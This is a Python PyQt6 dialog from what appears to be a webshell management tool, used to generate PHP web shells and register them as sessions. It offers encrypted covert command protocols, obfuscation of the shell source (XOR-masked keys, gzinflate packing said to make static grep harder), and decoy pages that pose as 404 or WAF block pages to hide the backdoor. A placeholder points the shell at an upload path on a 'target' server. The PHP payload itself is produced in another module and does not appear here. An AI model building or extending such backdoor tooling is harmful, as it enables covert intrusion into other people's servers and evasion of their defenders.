"""Payload generator dialog: build a shell that matches this client's protocol."""

from __future__ import annotations

import os
from pathlib import Path

from PyQt6.QtGui import QGuiApplication, QTextCursor
from PyQt6.QtWidgets import (
    QComboBox,
    QDialog,
    QFileDialog,
    QFormLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMessageBox,
    QPlainTextEdit,
    QPushButton,
    QVBoxLayout,
    QWidget,
)

from ... import payloads
from ...config import ShellConfig
from ...crypto import sm4
from ...protocol import CARRIERS
from ..widgets import mono_font


class GenerateDialog(QDialog):
    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.setWindowTitle("生成 Shell")
        self.resize(920, 720)
        self.created: ShellConfig | None = None
        self.source: payloads.ShellSource | None = None

        layout = QVBoxLayout(self)
        layout.setContentsMargins(12, 12, 12, 12)
        layout.setSpacing(8)

        form = QFormLayout()
        form.setSpacing(8)

        self.proto = QComboBox()
        self.proto.addItem("v2 — HKDF + HMAC + 时间窗 + 非重放", "v2")
        self.proto.addItem("v1 — SM4-CBC + Base64（兼容）", "v1")
        self.proto.currentIndexChanged.connect(self._regenerate)
        form.addRow("协议", self.proto)

        self.hardening = QComboBox()
        self.hardening.addItem("plain — 可读源码", "plain")
        self.hardening.addItem("light — 密钥/盐 XOR 掩码", "light")
        self.hardening.addItem("packed — gzinflate 打包（静态更难 grep，动态更显眼）", "packed")
        self.hardening.currentIndexChanged.connect(self._regenerate)
        form.addRow("静态处理", self.hardening)

        self.carrier = QComboBox()
        for carrier in CARRIERS:
            self.carrier.addItem(carrier, carrier)
        form.addRow("推荐载体", self.carrier)

        self.pass_param = QLineEdit("")
        self.pass_param.textChanged.connect(self._regenerate)
        form.addRow("请求参数名", self.pass_param)

        secret_row = QHBoxLayout()
        secret_row.setContentsMargins(0, 0, 0, 0)
        self.secret = QLineEdit(os.urandom(32).hex())
        self.secret.textChanged.connect(self._regenerate)
        secret_row.addWidget(self.secret, 1)
        random_button = QPushButton("重新随机")
        random_button.clicked.connect(self._randomize)
        secret_row.addWidget(random_button)
        secret_widget = QWidget()
        secret_widget.setLayout(secret_row)
        form.addRow("Secret (32B hex)", secret_widget)

        self.salt = QLineEdit(os.urandom(16).hex())
        self.salt.textChanged.connect(self._regenerate)
        form.addRow("Salt (16B hex)", self.salt)

        self.decoy = QComboBox()
        self.decoy.addItem("无（返回 404）", "")
        for name in payloads.decoy_names():
            self.decoy.addItem(f"WAF 伪装页 · {name}", name)
        self.decoy.addItem("自定义 HTML…", "__custom__")
        self.decoy.currentIndexChanged.connect(self._decoy_changed)
        self.decoy_file = ""
        form.addRow("伪装页", self.decoy)

        self.filename = QLineEdit("shell.php")
        form.addRow("保存文件名", self.filename)

        self.url = QLineEdit("")
        self.url.setPlaceholderText("http://target/upload/shell.php（用于创建会话）")
        form.addRow("Shell URL", self.url)

        layout.addLayout(form)

        hint = QLabel(
            "v2：Secret/Salt 经 HKDF-SHA256 派生 enc_key 与 mac_key，请求带随机 IV、时间戳、Nonce 与 HMAC；\n"
            "凭证错误 / 过期 / 重放 / 篡改一律返回仿冒 404 页面。生成后请把 Secret/Salt 一并添加到会话。"
        )
        hint.setObjectName("hint")
        hint.setWordWrap(True)
        layout.addWidget(hint)

        self.preview = QPlainTextEdit()
        self.preview.setReadOnly(True)
        self.preview.setFont(mono_font(11))
        layout.addWidget(self.preview, 1)

        buttons = QHBoxLayout()
        copy_button = QPushButton("复制源码")
        copy_button.clicked.connect(self._copy)
        buttons.addWidget(copy_button)
        save_button = QPushButton("保存到文件…")
        save_button.clicked.connect(self._save)
        buttons.addWidget(save_button)
        buttons.addStretch(1)
        self.add_button = QPushButton("生成并添加会话")
        self.add_button.setObjectName("primary")
        self.add_button.clicked.connect(self._add_session)
        buttons.addWidget(self.add_button)
        close_button = QPushButton("关闭")
        close_button.clicked.connect(self.reject)
        buttons.addWidget(close_button)
        layout.addLayout(buttons)

        self._regenerate()

    # ------------------------------------------------------------------ utils
    def _randomize(self) -> None:
        self.secret.setText(os.urandom(32).hex())
        self.salt.setText(os.urandom(16).hex())

    def _decoy_changed(self) -> None:
        if self.decoy.currentData() == "__custom__":
            path, _ = QFileDialog.getOpenFileName(self, "选择伪装页", "", "HTML (*.html *.htm);所有文件 (*)")
            if path:
                self.decoy_file = path
            else:
                self.decoy.setCurrentIndex(0)
        self._regenerate()

    def _decoy_text(self) -> str:
        choice = self.decoy.currentData() or ""
        if choice == "__custom__":
            if not self.decoy_file:
                return ""
            try:
                return Path(self.decoy_file).read_text(encoding="utf-8")
            except OSError:
                return ""
        if choice:
            path = payloads.decoy_path(str(choice))
            if path:
                return path.read_text(encoding="utf-8")
        return ""

    def _regenerate(self) -> None:
        proto = self.proto.currentData() or "v2"
        self.secret.setEnabled(proto == "v2")
        self.salt.setEnabled(proto == "v2")
        hardening = self.hardening.currentData() or "plain"
        try:
            secret = self.secret.text().strip()
            salt = self.salt.text().strip()
            if proto == "v2" and (len(secret) != 64 or len(salt) != 32):
                raise ValueError("v2 需要 64 位 secret 与 32 位 salt")
            source = payloads.generate_php(
                proto=proto,
                secret=secret if proto == "v2" else None,
                salt=salt if proto == "v2" else None,
                pass_param=self.pass_param.text().strip() or None,
                hardening=hardening,
                carrier=self.carrier.currentData() or "form",
                filename=self.filename.text().strip() or "shell.php",
                decoy=self._decoy_text(),
            )
        except ValueError as exc:
            self.preview.setPlainText(f"# 参数错误: {exc}")
            self.add_button.setEnabled(False)
            self.source = None
            return
        self.add_button.setEnabled(True)
        self.source = source
        self.preview.setPlainText(source.code)
        self.preview.moveCursor(QTextCursor.MoveOperation.Start)

    def _copy(self) -> None:
        if self.source:
            QGuiApplication.clipboard().setText(self.source.code)
            QMessageBox.information(self, "已复制", "Shell 源码已复制到剪贴板。")

    def _save(self) -> None:
        if not self.source:
            return
        target, _ = QFileDialog.getSaveFileName(
            self, "保存 Shell", self.filename.text().strip() or "shell.php", "PHP 文件 (*.php);;所有文件 (*)"
        )
        if not target:
            return
        Path(target).write_text(self.source.code, encoding="utf-8")
        self.filename.setText(Path(target).name)
        QMessageBox.information(
            self,
            "已保存",
            f"已写入 {target}\n\n协议: {self.source.proto} | Secret: {self.source.secret_hex or '-'}",
        )

    def _add_session(self) -> None:
        if not self.source:
            return
        source = self.source
        config = ShellConfig(
            name=self.filename.text().strip() or "php-shell",
            url=self.url.text().strip(),
            proto=source.proto,
            key=source.key_hex,
            iv=source.iv_hex,
            secret=source.secret_hex,
            salt=source.salt_hex,
            pass_param=source.pass_param,
            carrier=source.carrier,
            remark=f"generated by webshell-mag ({source.proto}/{source.hardening})",
        )
        self.created = config
        self.accept()
